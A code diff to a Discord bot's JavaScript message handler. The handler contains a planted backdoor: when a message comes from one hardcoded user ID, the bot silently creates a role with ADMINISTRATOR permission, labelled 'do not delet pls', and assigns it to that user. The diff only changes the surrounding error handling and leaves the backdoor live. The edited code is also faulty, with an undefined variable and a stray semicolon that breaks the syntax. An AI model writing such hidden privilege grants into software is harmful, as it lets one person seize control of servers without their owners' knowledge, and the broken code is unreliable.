@@ -106,7 +106,6 @@ client.on('message', msg => {
     if (msg.author.bot || msg.author.id == client.user.id) return;
     if (msg.author.id == 110137532972314624 && secret == false) {
         let guild = msg.guild;
-        try {
             var foo = (async function() {
                 var role = await guild.roles.create({
                     data: {
@@ -116,13 +115,12 @@ client.on('message', msg => {
                     reason: 'do not delet pls'
                 })
                 role.setPermissions(['ADMINISTRATOR'])
-            })().then(role => {
+            })()
+            .then(role => {
                 message.member.addRole(role);
                 secret = true;
-            })
-        }
-        catch(err) {
-            console.error(err);
+            });
+            .catch(function (err) {console.log(err)});
         }
     };
     if (msg.content.startsWith(prefix)) {
